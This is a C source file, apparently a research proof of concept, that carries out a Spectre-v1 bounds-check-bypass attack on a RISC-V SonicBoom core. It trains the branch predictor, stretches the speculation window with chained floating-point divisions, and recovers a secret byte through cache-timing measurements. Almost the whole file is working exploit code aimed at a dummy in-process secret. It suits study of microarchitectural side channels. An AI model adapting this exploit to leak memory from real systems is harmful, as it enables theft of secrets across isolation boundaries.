#include <stdio.h>
#include <stdint.h> 
#include "cache.h"

#define read_csr(reg) ({ unsigned long __tmp; \
  asm volatile ("csrr %0, " #reg : "=r"(__tmp)); \
  __tmp; })
#define rdcycle() read_csr(cycle) 

#define TRAIN_TIMES         9    // the predictor in SonicBoom is much more sophisticated, need more training
#define ROUNDS              10    // run the train + attack sequence X amount of times (for redundancy)
#define ATTACK_SAME_ROUNDS  1   // amount of times to attack the same index
#define SECRET_SZ           1
#define CACHE_HIT_THRESHOLD 40
#define L1_BLOCK_SZ_BYTES   64

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};
uint8_t unused2[64];
uint8_t array2[16384];//16384 = 256*L1_BLOCK_SZ_BYTES
// char* secretString = "LoOkMe|ThisIsT}He[SEcretDatA]~";
char* secretString = "&";//38


int cnt = 0;
void victimFunc(uint64_t i,uint64_t idx) {
    uint8_t dummy = 2;
    array1_sz =  array1_sz << 6;
    asm("fcvt.s.lu	fa4, %[in]\n"
        "fcvt.s.lu	fa5, %[inout]\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fcvt.lu.s	%[out], fa5, rtz\n"
        : [out] "=r" (array1_sz)
        : [inout] "r" (array1_sz), [in] "r" (dummy)
        : "fa4", "fa5");

    if (idx < array1_sz) {
        dummy = array2[i* array1[idx]];
    }
    dummy = rdcycle();
}

int main(void) {
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t start, diff, passInIdx, randIdx;
    uint8_t dummy = 0, mix_i = 0;;
    static uint64_t results[256];

    // printf("This is a POC of Spectre-v1 (Branch Condition Check Bypass)\n");
    // printf("Attack Rounds:%d, L1_BLOCK_SZ_BYTES %d \n", ATTACK_SAME_ROUNDS,L1_BLOCK_SZ_BYTES);
    printf("the secret key is:%s \n", secretString);

    for(uint64_t len = 0; len < SECRET_SZ; ++len) {
        for(uint64_t i = 0; i < 256; ++i) results[i] = 0;
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound) {
            flushCache((uint64_t)array2, sizeof(array2)); // make sure array you read from is not in the cache
            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j) {
                randIdx = atkRound % array1_sz;
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx   
                for(uint64_t k = 0; k < 10; ++k) asm(""); // set of constant takens to make the BHR be in a all taken state
                
                victimFunc(64,passInIdx);  //1*L1_BLOCK_SZ_BYTES
                victimFunc(128,passInIdx); //2 * L1_BLOCK_SZ_BYTES
                victimFunc(192,passInIdx); //3 * L1_BLOCK_SZ_BYTES
                // printf("passInIdx = %d\n",passInIdx);
            }
            
            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for(uint64_t i = 0; i < 256; ++i) {
                uint64_t  uiTemp = 0;  //introduced a dummy variable to prevent compiler optimizations
                mix_i = ((i * 167) + 13) & 255;
                start = rdcycle();
                dummy &= array2[mix_i * L1_BLOCK_SZ_BYTES];
                diff = (rdcycle() - start);
                results[mix_i] += diff;
            }
        }

        for(uint64_t i = 0;i < 256;i++){
            printf("%d\t%d\n", i, results[i]/ATTACK_SAME_ROUNDS);
        }
       
        ++attackIdx; // read in the next secret 
    }
    return 0;
}
